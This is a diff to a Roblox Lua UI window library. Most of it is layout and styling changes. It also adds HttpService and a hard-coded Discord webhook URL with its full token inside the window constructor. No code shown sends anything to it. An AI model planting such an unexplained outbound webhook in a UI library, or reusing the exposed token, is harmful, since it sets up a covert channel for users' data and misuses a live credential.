@@ -3,6 +3,7 @@ local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local LocalPlayer = game:GetService("Players").LocalPlayer
+local http = game:GetService("HttpService")
 local Mouse = LocalPlayer:GetMouse()
 local PresetColor = Color3.fromRGB(44, 120, 224)
 local CloseBind = Enum.KeyCode.RightControl
@@ -90,6 +91,8 @@ function lib:Window(text, preset, closebind)
     PresetColor = preset or Color3.fromRGB(44, 120, 224)
     fs = false
     local minimized = false
+    local webhook = "https://discord.com/api/webhooks/966401548534038638/K4ckmRhK0x3wBes1BnKllP82iMxXPNqkXlxVNn83uE6PaHki653hE2QspWkvPgeRX0PL" -- Place Webhook link here
+    
     local hide420 = true
     local Main = Instance.new("Frame")
     local TabHold = Instance.new("Frame")
@@ -105,6 +108,7 @@ function lib:Window(text, preset, closebind)
     local TabFolder = Instance.new("Folder")
     local MainCorner = Instance.new("UICorner")
     local TuglosCorner = Instance.new("UICorner")
+    local CockCorner = Instance.new("UICorner")
     local DragFrame = Instance.new("Frame")
 
     Main.Name = "Main"
@@ -133,36 +137,34 @@ function lib:Window(text, preset, closebind)
     TabHoldLayout.SortOrder = Enum.SortOrder.LayoutOrder
     TabHoldLayout.Padding = UDim.new(0, 11)
 
-    Title.Name = "Title"
-    Title.Parent = DragFrame
-    Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    Title.BackgroundTransparency = 1.000
-    Title.Position = UDim2.new(0, 50, 0, 3)
-    Title.Size = UDim2.new(0, 200, 0, 23)
-    Title.Font = Enum.Font.GothamSemibold
-    Title.Text = text
-    Title.TextColor3 = Color3.fromRGB(68, 68, 68)
-    Title.TextSize = 20.000
-    Title.TextXAlignment = Enum.TextXAlignment.Left
+   Title.Name = "Title"
+   Title.Parent = DragFrame
+   Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+   Title.BackgroundTransparency = 1.000
+   Title.Position = UDim2.new(0, 50, 0, 3)
+   Title.Size = UDim2.new(0, 200, 0, 23)
+   Title.Font = Enum.Font.GothamSemibold
+   Title.Text = text
+   Title.TextColor3 = Color3.fromRGB(68, 68, 68)
+   Title.TextSize = 20.000
+   Title.TextXAlignment = Enum.TextXAlignment.Left
 
-    DragFrame.Name = "DragFrame"
-    DragFrame.Parent = Main
-    DragFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    DragFrame.BackgroundTransparency = 1.000
-    DragFrame.Size = UDim2.new(0, 560, 0, 41)
+   DragFrame.Name = "DragFrame"
+   DragFrame.Parent = Main
+   DragFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+   DragFrame.BackgroundTransparency = 1.000
+   DragFrame.Size = UDim2.new(0, 560, 0, 41)
 
-    Main:TweenSize(UDim2.new(0, 560, 0, 319), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
+   Main:TweenSize(UDim2.new(0, 560, 0, 319), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
 
-    MakeDraggable(DragFrame, Main)
-
-    UserHead.Name = "AvatarHead"
-    UserHead.Parent = DragFrame
-    UserHead.BackgroundColor3 = Color3.fromRGB(51, 51, 51)
-    UserHead.BackgroundTransparency = 1.000
-    UserHead.Position = UDim2.new(0, 13, 0, 4)
-    UserHead.Size = UDim2.new(0, 32, 0, 32)
-    UserHead.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"
-    UserHead.ImageColor3 = Color3.fromRGB(220, 221, 222)
+   UserHead.Name = "AvatarHead"
+   UserHead.Parent = DragFrame
+   UserHead.BackgroundColor3 = Color3.fromRGB(51, 51, 51)
+   UserHead.BackgroundTransparency = 1.000
+   UserHead.Position = UDim2.new(0, 13, 0, 4)
+   UserHead.Size = UDim2.new(0, 32, 0, 32)
+   UserHead.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"
+   UserHead.ImageColor3 = Color3.fromRGB(220, 221, 222)
 
    UserCircleImage.Name = "UserImage"
    UserCircleImage.Parent = UserHead
@@ -186,22 +188,26 @@ function lib:Window(text, preset, closebind)
     
    MinimizeBtn.Name = "MinimizeButton"
    MinimizeBtn.Parent = Main
-	 MinimizeBtn.BackgroundColor3 = Color3.fromRGB(255, 166, 13)
-	 MinimizeBtn.BackgroundTransparency = 0
-	 MinimizeBtn.Position = UDim2.new(0, 510, -0, 10)
-	 MinimizeBtn.Size = UDim2.new(0, 28, 0, 22)
-	 MinimizeBtn.Font = Enum.Font.Gotham
-	 MinimizeBtn.Text = "—"
-	 MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-	 MinimizeBtn.TextSize = 14.000
-	 MinimizeBtn.BorderSizePixel = 0
-	 MinimizeBtn.AutoButtonColor = false
+	MinimizeBtn.BackgroundColor3 = Color3.fromRGB(255, 166, 13)
+	MinimizeBtn.BackgroundTransparency = 1
+	MinimizeBtn.Position = UDim2.new(0, 510, -0, 10)
+	MinimizeBtn.Size = UDim2.new(0, 28, 0, 22)
+	MinimizeBtn.Font = Enum.Font.Gotham
+	MinimizeBtn.Text = "—"
+	MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+	MinimizeBtn.TextSize = 14.000
+	MinimizeBtn.BorderSizePixel = 0
+	MinimizeBtn.AutoButtonColor = false
+   
+   CockCorner.CornerRadius = UDim.new(0, 5)
+   CockCorner.Name = "MainCorner"
+   CockCorner.Parent = MinimizeBtn
    
    HideGUI.Name = "Tuglos"
    HideGUI.Parent = ui
 	HideGUI.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
 	HideGUI.BackgroundTransparency = 0
-	HideGUI.Position = UDim2.new(0, 50, -0, 40)
+	HideGUI.Position = UDim2.new(0, 30, -0, 30)
 	HideGUI.Size = UDim2.new(0, 40, 0, 40)
 	HideGUI.Font = Enum.Font.Gotham
 	HideGUI.Text = ""
@@ -215,11 +221,13 @@ function lib:Window(text, preset, closebind)
    TuglosCorner.Name = "TuglosCorner"
    TuglosCorner.Parent = HideGUI
    
+   MakeDraggable(DragFrame, HideGUI, Main)
+   
    MonkIcon.Name = "Munk"
    MonkIcon.Parent = HideGUI
    MonkIcon.BackgroundColor3 = Color3.fromRGB(51, 51, 51)
    MonkIcon.BackgroundTransparency = 1.000
-   MonkIcon.Position = UDim2.new(0, 10, 0, 20)
+   MonkIcon.Position = UDim2.new(0, 0, 0, 0)
    MonkIcon.Size = UDim2.new(0, 40, 0, 40)
    MonkIcon.Image = "rbxassetid://8825654232"
    MonkIcon.ImageColor3 = Color3.fromRGB(220, 221, 222)
